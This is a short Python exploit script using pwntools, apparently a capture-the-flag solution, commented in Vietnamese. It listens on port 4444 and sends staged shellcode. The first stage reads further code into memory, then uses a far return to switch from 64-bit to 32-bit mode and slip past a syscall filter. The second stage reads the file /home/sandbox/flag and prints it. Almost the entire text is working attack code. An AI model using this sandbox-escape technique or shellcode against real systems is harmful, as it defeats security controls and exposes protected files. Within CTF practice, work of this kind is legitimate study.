import socket
from pwn import *
context.clear(arch="amd64")
s = socket.socket()         # Tao mot doi tuong socket
host = "ip"            # Lay ten thiet bi local
port = 4444               # Danh rieng mot port cho dich vu cua ban.
s.bind((host, port))        # Ket noi toi port
shellcode =''
# read shellcode
shellcode += asm(shellcraft.amd64.linux.read(fd=0, buffer=0x40000, count=0x500))
# convert from x64 to x86 to bypass filter syscall and execute shellcode at 0x40000
shellcode += asm("""
	xor rsp, rsp
	mov esp, 0x40500
	mov DWORD PTR [esp+4], 0x23
	mov DWORD PTR [esp], 0x40000
	retf
""")
s.listen(5)                 # Doi 5 s de ket noi voi client.
print "Listenning in %s:%s" %(host, port)
while True:
	print "\n"
	c, addr = s.accept()     # Thiet lap ket noi voi client.
	print "Connected from", addr
	print "\n"
	c.send(shellcode+'\n')
	context.clear(arch="i386")
	# send shellcode
	payload=asm(shellcraft.i386.linux.readfile("/home/sandbox/flag",dst='edi'))
	payload+=asm(shellcraft.i386.linux.read('edi',0x40600,0x50))
	payload+=asm(shellcraft.i386.linux.write(2,0x40600,0x50))
	c.send(payload+'\n')
	print c.recv(0xffff)
	c.close()                # Ngat ket noi
